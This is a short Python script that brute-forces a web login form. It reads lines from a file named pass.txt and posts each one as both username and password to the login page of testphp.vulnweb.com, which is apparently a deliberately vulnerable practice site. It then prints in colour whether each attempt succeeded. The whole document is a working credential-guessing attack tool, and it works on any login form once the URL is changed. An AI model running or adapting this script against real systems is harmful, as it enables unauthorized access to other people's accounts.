import requests
import colored
from colored import stylize

weburl = "http://testphp.vulnweb.com/userinfo.php"

with open("pass.txt" , "r") as data:
      last = data.readlines()

for i in last:
    userpostdata = {
    "uname":i.rstrip(),
    "pass":i.rstrip()
    }
    r = requests.post(weburl, data=userpostdata )
    if r.url == weburl :
        print(stylize(f"Login success.= {i.rstrip()}", colored.fg("green")))
    else :
        print(stylize(f"Login failed.= {i.rstrip()}", colored.fg("red")))
